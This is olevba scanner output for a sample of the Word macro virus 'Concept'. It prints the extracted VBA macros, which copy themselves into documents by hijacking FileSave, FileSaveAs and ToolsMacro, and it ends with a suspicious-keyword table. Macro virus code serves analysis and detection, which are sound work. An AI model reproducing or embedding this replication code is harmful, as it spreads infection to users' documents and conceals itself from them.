olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Concept-51052d7c26e5c893d86e86a4a07ba15b2292f701
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Concept-51052d7c26e5c893d86e86a4a07ba15b2292f701 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AAAAAD.bas 
in file: Virus.MSWord.Concept-51052d7c26e5c893d86e86a4a07ba15b2292f701 - OLE stream: 'Macros/VBA/AAAAAD'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AAAAAD.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
WordBasic.CurValues.ToolsMacro dlg
dlg.Show = 4
On Error GoTo -1: On Error GoTo Done
WordBasic.Dialog.ToolsMacro dlg
WordBasic.ToolsMacro dlg
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AAAAAC.bas 
in file: Virus.MSWord.Concept-51052d7c26e5c893d86e86a4a07ba15b2292f701 - OLE stream: 'Macros/VBA/AAAAAC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Fname$
Dim sMe$
Dim sTMacro$
Dim dlg As Object
Fname$ = WordBasic.[Left$](WordBasic.[Right$](WordBasic.[FileName$](), 12), 8)
If (Fname$ = "Document") Or (Fname$ = "Template") Then GoTo Bail
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AAAAAA", sTMacro$
sTMacro$ = sMe$ + ":AAAAAB"
WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$
sTMacro$ = sMe$ + ":AAAAAC"
WordBasic.MacroCopy "Global:FileSave", sTMacro$
sTMacro$ = sMe$ + ":AAAAAD"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
GoTo Done

Bail:
If Err.Number <> 102 Then
Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
On Error GoTo -1: On Error GoTo Done
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AAAAAA", sTMacro$
sTMacro$ = sMe$ + ":AAAAAB"
WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$
sTMacro$ = sMe$ + ":AAAAAC"
WordBasic.MacroCopy "Global:FileSave", sTMacro$
sTMacro$ = sMe$ + ":AAAAAD"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AAAAAB.bas 
in file: Virus.MSWord.Concept-51052d7c26e5c893d86e86a4a07ba15b2292f701 - OLE stream: 'Macros/VBA/AAAAAB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AAAAAA", sTMacro$
sTMacro$ = sMe$ + ":AAAAAB"
WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$
sTMacro$ = sMe$ + ":AAAAAC"
WordBasic.MacroCopy "Global:FileSave", sTMacro$
sTMacro$ = sMe$ + ":AAAAAD"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

